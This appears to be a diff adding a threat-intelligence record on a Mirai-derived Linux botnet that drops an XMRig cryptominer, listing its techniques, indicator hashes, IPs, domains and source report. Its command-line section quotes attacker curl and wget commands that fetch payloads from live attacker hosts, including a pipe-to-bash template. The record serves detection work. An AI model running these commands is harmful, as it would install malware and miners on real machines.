@@ -1,0 +1,58 @@
+description: Active Linux-targeting campaign deploying a Mirai-derived botnet with
+  stealthy, fileless-configured cryptominer.
+malware_families:
+- Mirai
+- XMRig
+TTPs:
+  processes:
+  - systemd-logind
+  - Mddos.x86_64
+  - xmrig.x86_64
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - curl -o Mddos.x86_64 http://103.149.93.224/bins/Mddos.x86_64
+  - wget -q -O /tmp/.dbus-daemon http://159.75.47.123/bins/xmrig.x86_64 2>/dev/null
+  - http://%s/bins/xmrig.%s
+  - wget -q -O - %s | bash -
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - Mddos.x86_64, baojunwakuang.asia, 159.75.47.123
+  - xmrig.x86_64, Auto.c3pool.org, 19999
+  - 60154 -> 39278
+  - 53 -> 35750
+  file_activity:
+  - /tmp/Mddos.x86_64
+  - /tmp/.dbus-daemon
+  - /bins/xmrig.%s
+  persistence:
+  - Masquerades as systemd-logind
+  - Uses localhost TCP listener on 127.0.0.1:63841 for IPC
+  process_relations: []
+IOCs:
+  hashes:
+  - 2c0261e6a3590e3554202116c5398637d0d7900895646d0aaf46d117aadd1612
+  - 8350cd4e9b2f1056c8ccdf0d1b2406b32634840aa304d535ad4b6be5b365275c
+  - d5c55f18b1a7c01d3e4fb657b00aa677784640fef3c1742243a65ded07aeccc6
+  - 2e6fecefa3062d2306124e014643a14066981f4865dedbeffb8c1d057dc650b2
+  - 39ead6055306739ab969a3531bde2050f556b05e500894b3cda120178f2773be
+  ip_addresses:
+  - 103.149.93.224
+  - 159.75.47.123
+  domains:
+  - baojunwakuang.asia
+  - Auto.c3pool.org
+  - auto.c3pool.org
+  urls:
+  - http://103.149.93.224/bins/Mddos.x86_64
+  - http://159.75.47.123/bins/xmrig.x86_64
+  - http://%s/bins/xmrig.%s
+authors:
+- Cyble Research & Intelligence Labs (CRIL)
+reference: https://cyble.com/blog/v3g4-mirai-botnet-evolves/
+date_of_publication: December 03, 2025
+file_creation_date: December 04, 2025
